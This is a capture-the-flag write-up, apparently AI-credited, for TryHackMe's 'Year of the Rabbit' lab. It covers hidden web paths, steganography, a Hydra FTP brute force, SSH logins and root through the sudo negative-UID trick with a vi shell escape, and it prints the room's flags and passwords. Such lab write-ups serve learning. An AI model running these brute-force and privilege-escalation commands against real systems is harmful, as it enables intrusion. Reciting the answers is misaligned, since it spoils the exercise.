# THM: Year of the Rabbit - Write-up

## Room Information
- **Platform**: TryHackMe
- **Difficulty**: Easy
- **OS**: Linux
- **Tags**: Web, Steganography, Enumeration, CTF

---

## Flags

| Level | Flag | Hash |
|-------|------|-----|
| User | Gwendoline | `THM{1107174691af9ff3681d2b5bdb5740b1589bae53}` |
| Root | Root | `THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}` |

---

## reconnaissance

### Port Scan

```bash
nmap -sV -sC 10.64.139.203
```

**Results:**
| Port | Service | Version |
|------|--------|--------|
| 21 | FTP | vsftpd 3.0.2 |
| 22 | SSH | OpenSSH 6.7p1 Debian |
| 80 | HTTP | Apache 2.4.10 (Debian) |

---

## Initial Access

### 1. Web Enumeration

Target website shows default Apache page. Enumerating directories:

```bash
curl http://yearoftherabbit.thm/assets/
```

Found: `/assets/` directory containing:
- `style.css`
- `RickRolled.mp4` (384MB - fake video)

### 2. Hidden Page Discovery

Reading `style.css` reveals a comment:
```css
/* Nice to see someone checking the stylesheets.
   Take a look at the page: /sup3r_s3cr3t_fl4g.php */
```

Accessing `/sup3r_s3cr3t_fl4g.php` with JavaScript enabled shows a Rick Roll video.

### 3. Bypassing JavaScript

**Key insight from the video audio:** "You're looking in the wrong place... burp"

Using Burp Suite or disabling JavaScript reveals a hidden redirection:
```
/intermediary.php?hidden_directory=/WExYY2Cv-qU
```

### 4. Hidden Directory

Navigating to the hidden directory:
```bash
curl http://yearoftherabbit.thm/WExYY2Cv-qU/
```

Found: `Hot_Babe.png` (464KB)

### 5. Steganography Analysis

Downloading and analyzing the image:
```bash
wget http://yearoftherabbit.thm/WExYY2Cv-qU/Hot_Babe.png
strings Hot_Babe.png | tail -40
```

**Found credentials:**
- FTP Username: `ftpuser`
- Wordlist: 30 potential passwords embedded in the image

### 6. FTP Brute Force

Using Hydra to crack FTP:
```bash
hydra -l ftpuser -P wordlist.txt yearoftherabbit.thm ftp
```

**Valid credentials:** `ftpuser:5iez1wGXKfPKQ`

### 7. FTP Access

```bash
ftp yearoftherabbit.thm
# Login: ftpuser
# Password: 5iez1wGXKfPKQ
```

Found file: `Eli's_Creds.txt` - contains Brainfuck code

### 8. Brainfuck Decoding

The file contains esoteric Brainfuck code. Decoding reveals:
- Username: `eli`
- Password: `DSpDiM1wAEwid`

---

## Foothold

### SSH Access as eli

```bash
ssh eli@yearoftherabbit.thm
# Password: DSpDiM1wAEwid
```

Logged in successfully.

---

## Privilege Escalation

### 1. Finding the Hidden Message

Exploring the system reveals message from Root:
```
Message from Root to Gwendoline:
"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place.
I've left you a hidden message there"
```

### 2. Locating the Secret Directory

```bash
find / -name "*secret*" -o -name "*s3cr3t*"
```

Found: `/usr/games/s3cr3t/` containing hidden file

### 3. Reading Gwendoline's Message

```bash
cat /usr/games/s3cr3t/.th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

**Content:**
```
Your password is awful, Gwendoline.
It should be at least 60 characters long! Not just MniVCQVhQHUNI
Honestly!

Yours sincerely,
   -Root
```

### 4. SSH Access as Gwendoline

```bash
ssh gwendoline@yearoftherabbit.thm
# Password: MniVCQVhQHUNI
```

### 5. User Flag

```bash
cat /home/gwendoline/user.txt
THM{1107174691af9ff3681d2b5bdb5740b1589bae53}
```

### 6. Root Escalation via sudo vi

Gwendoline can run:
```bash
sudo -l
# Output: (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
```

Exploiting vi with negative UID:
```bash
sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
:!whoami
# Output: root
```

### 7. Root Shell

```bash
:!/bin/bash
# Drop to root shell
cat /root/root.txt
THM{8d6f163a87a1c80de27a4fd61aef0f3a0ecf9161}
```

---

## Vulnerability Summary

| Technique | Details |
|-----------|---------|
| **Information Disclosure** | Hidden paths in CSS comments |
| **JavaScript Bypass** | Hidden redirect via Burp Suite |
| **Steganography** | Passwords embedded in PNG |
| **Weak Credentials** | FTP brute force dictionary attack |
| **Code Review** | Brainfuck code in FTP file |
| **sudo Misconfiguration** | vi with NOPASSWD allows root |

---

## MITRE ATT&CK Mapping

| Tactic | Technique | ID |
|--------|----------|-----|
| Reconnaissance | Active Scanning | T1595 |
| Reconnaissance | Web Technology Disclosure | T1592 |
| Initial Access | Exploit Public-Facing Application | T1190 |
| Credential Access | Brute Force | T1110 |
| Credential Access | Credentials from Password Stores | T1555 |
| Privilege Escalation | Exploitation for Privilege Escalation | T1068 |
| Privilege Escalation | sudo and sudo | T1169 |

---

## Remediation

1. **Disable JavaScript hints** - Don't expose paths in client-side code
2. **Remove steganography** - Clean metadata from images before deployment
3. **Strong passwords** - Enforce minimum length and complexity
4. **sudo restrictions** - Remove NOPASSWD rules for vi/less/more
5. **File permissions** - Restrict access to sensitive directories

---

## Tools Used

- nmap
- curl
- Burp Suite
- wget
- strings
- Hydra
- brainfuck interpreter
- find, ls, cat

---

## Time to Complete

~45 minutes (beginner-friendly)

---

*Write-up by: HexStrike AI*
*Date: 2026-04-18*